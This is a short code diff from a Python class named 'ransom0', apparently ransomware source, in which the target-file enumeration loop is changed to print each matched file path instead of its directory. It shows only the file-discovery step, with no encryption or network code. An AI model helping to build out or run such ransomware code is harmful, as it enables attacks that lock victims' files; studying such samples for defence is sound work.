@@ -122,7 +122,7 @@ class ransom0:
                     if file.endswith(self.EXTENSIONS):
                         TARGET = os.path.join(root, file)
                         f.write(TARGET+'\n')
-                        print(root)
+                        print(TARGET)
 
         f.close()
         f = open("logs/cnt.txt", "w")
